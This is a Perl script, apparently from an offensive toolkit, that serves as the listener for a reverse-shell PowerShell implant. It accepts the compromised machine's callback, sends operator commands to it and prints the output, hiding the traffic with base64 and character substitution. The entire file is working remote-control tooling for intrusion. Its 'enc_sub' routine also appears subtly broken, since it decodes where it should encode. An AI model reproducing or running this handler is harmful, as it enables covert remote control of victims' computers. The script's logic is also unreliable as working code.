#!/usr/bin/perl
#
# Simple base64 encoded tcp listener for 
# use with the base64 encoded reverse 
# tcp powershell implant "b64-tclient.ps1" 
#
#           part of the Fathomless Project 
#	                      xor-function 
#

use strict;
use warnings;
use MIME::Base64;
use IO::Socket::INET;

sub banner {

	print "\n[+]=============================================================[+]";
	print "\n[+]               base64 reverse tcp shell handler              [+]";
	print "\n[+]                                                             [+]";
	print "\n[+] Fathomless Project                            xor-function  [+]";
	print "\n[+]=============================================================[+]\n";

}

sub usage {   

        print "[!] usage :  ./b64-encodedtcp.pl [ port-number-to-listen-on ]  \n";
	exit(0);
} 


sub enc_string {

        my $string = $_[0];
        my $enc_string = encode_base64($string);

        return $enc_string;

}

sub dec_string {

        my $raw_string = $_[0];
        my $text = decode_base64($raw_string);

        return $text;
}

# decodes a base64 string with subtituded characters.
sub enc_desub {

        my $raw_string = $_[0];

        $raw_string =~ tr/!/=/;
        $raw_string =~ tr/_/\//;
        $raw_string =~ tr/-/+/;

        my $dec_string = decode_base64($raw_string);

        return $dec_string;
}

# encodes a base64 string with subtituded characters. 
sub enc_sub {

        my $raw_string = $_[0];

        $raw_string =~ tr/=/!/;
        $raw_string =~ tr/\//_/;
        $raw_string =~ tr/+/-/;

        my $dec_string = decode_base64($raw_string);

        return $dec_string;

}

sub main  {

	banner();

	#[->] limit arguments 
	if ( @_ < 1 || @_ > 1 ) { usage(); }

	my $port = $_[0]; 

	#[->] test argument 
	unless ( $port =~ /[0-9]/ ) { print "[!] The port provided is not a valid number!"; usage(); }

	print "[+] listening on port : $port \n";

	#[->] Keep pipes hot 
	$| = 1;

	#[->] Constructor of IO:Socket::INET object
	my $socket = new IO::Socket::INET ( LocalHost => '0.0.0.0', 
					    LocalPort => "$port", 
					    Proto => 'tcp',
					    Type => SOCK_STREAM, 
					    Listen => 5,
				  	    KeepAlive => 1,				    
                                    	  ) or die "ERROR in Socket Creation : $! \n";


	#[->] wait for new client connection.
	my $client_socket = $socket->accept();

	#[->] get the host and port number of new client.
	my $client_addr = $client_socket->peerhost();
	my $client_port = $client_socket->peerport();

	print "[!] New Client Connection From [ $client_addr : $client_port ]\n";

	while ($client_socket) 
	{

        	#[->] Reading encoded tcp data
        	my $enc_sub_rdata = '';
        	$client_socket->recv($enc_sub_rdata,2048);

		my $rdata = enc_desub($enc_sub_rdata);

		# print "$rdata";
        	my $clr_rdata = dec_string($rdata);
		print $clr_rdata;

		#[->] Encoding text before transport
		my $sdata = '';
		$sdata = <STDIN>;
		my $enc_sdata = enc_string($sdata);

		my $enc_sub_sdata = enc_sub($enc_sdata);
		$client_socket->send($enc_sub_sdata);

		#[->] notify client that response has been sent
		# shutdown($client_socket, 1);

	}

	$socket->close();

}

main(@ARGV);
